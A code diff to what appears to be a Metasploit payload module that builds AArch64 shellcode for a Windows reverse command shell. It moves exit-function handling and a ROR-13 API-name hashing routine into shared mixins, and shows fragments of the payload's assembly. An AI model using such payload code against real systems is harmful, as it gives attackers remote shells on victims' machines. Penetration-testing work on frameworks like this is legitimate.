@@ -9,6 +9,8 @@ module MetasploitModule
   CachedSize = 664
 
   include Msf::Payload::Windows
+  include Msf::Payload::Windows::Aarch64
+  include Msf::Payload::Windows::Exitfunk_Aarch64
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
 
@@ -54,16 +56,11 @@ module MetasploitModule
     ip_lo_imm = ip_bytes[0, 2].unpack1('v')
     ip_hi_imm = ip_bytes[2, 2].unpack1('v')
 
-    # The exitfunk block re-resolves the chosen kernel32 exit API by hash
-    # at runtime; we patch the two MOVZ/MOVK immediates with the hash.
-    exit_hash = exitfunk_hash(datastore['EXITFUNC'])
-
     asm = build_asm(
       port_imm: port_imm,
       ip_lo_imm: ip_lo_imm,
       ip_hi_imm: ip_hi_imm,
-      exit_lo: exit_hash & 0xFFFF,
-      exit_hi: (exit_hash >> 16) & 0xFFFF
+      exitfunk: datastore['EXITFUNC']
     )
 
     compile_aarch64(asm)
@@ -71,39 +68,7 @@ module MetasploitModule
 
   private
 
-  # ROR-13 hash of a kernel32 export name, matching the asm find_function
-  # routine. The asm stops on CBZ before adding the NUL terminator, so we
-  # hash bytes only (no trailing zero).
-  #
-  # Sanity checks (verified against rev2.s constants):
-  #   ror13_hash('TerminateProcess') == 0x78b5b983
-  #   ror13_hash('LoadLibraryA')     == 0xec0e4e8e
-  #   ror13_hash('CreateProcessA')   == 0x16b3fe72
-  def ror13_hash(str)
-    h = 0
-    str.each_byte do |b|
-      h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
-      h = (h + b) & 0xFFFFFFFF
-    end
-    h
-  end
-
-  def exitfunk_hash(value)
-    case value.to_s.downcase
-    when 'thread'
-      ror13_hash('ExitThread')
-    when 'process', ''
-      0x78b5b983 # TerminateProcess (known constant; also == ror13_hash('TerminateProcess'))
-    when 'none'
-      # 'none' is best-effort here: we still need *something* to call so the
-      # shellcode doesn't fall off into garbage. ExitProcess is the safest.
-      ror13_hash('ExitProcess')
-    else
-      0x78b5b983
-    end
-  end
-
-  def build_asm(port_imm:, ip_lo_imm:, ip_hi_imm:, exit_lo:, exit_hi:)
+  def build_asm(port_imm:, ip_lo_imm:, ip_hi_imm:, exitfunk:)
     # Differences from the standalone rev2.s prototype:
     #   - `.text` / `.global` directives stripped (aarch64 gem rejects them)
     #   - `[reg, wreg, uxtw #N]` rewritten as `mov w15, w4; lsl x15, x15, #N;
@@ -119,7 +84,7 @@ module MetasploitModule
     # Gaps at 0x10 and 0x20 are intentional -- previously held cached
     # TerminateProcess (re-resolved by exitfunk now) and OpenProcessToken
     # (was unused dead code), preserved to keep slot offsets stable.
-    <<~ASM
+    asm = <<~ASM
       main:
         sub     sp, sp, #0x300
         mov     x29, sp
@@ -330,29 +295,7 @@ module MetasploitModule
         blr     x9
 
         add     sp, sp, #0xB0
-
-      exitfunk:
-        ldr     x3, [x29, #0x00]
-        movz    w0, ##{format('0x%04x', exit_lo)}
-        movk    w0, ##{format('0x%04x', exit_hi)}, lsl #16
-        ldr     x9, [x29, #0x08]
-        blr     x9
-        mov     x10, x0
-        movn    x0, #0
-        mov     w1, wzr
-        blr     x10
-        brk     #0
     ASM
-  end
-
-  def compile_aarch64(asm_string)
-    require 'aarch64/parser'
-    parser = ::AArch64::Parser.new
-    asm = parser.parse(without_inline_comments(asm_string))
-    asm.to_binary
-  end
-
-  def without_inline_comments(string)
-    string.lines.map { |line| line.split('//', 2).first.strip }.reject(&:empty?).join("\n")
+    asm + asm_exitfunk_aarch64(exitfunk: exitfunk)
   end
 end
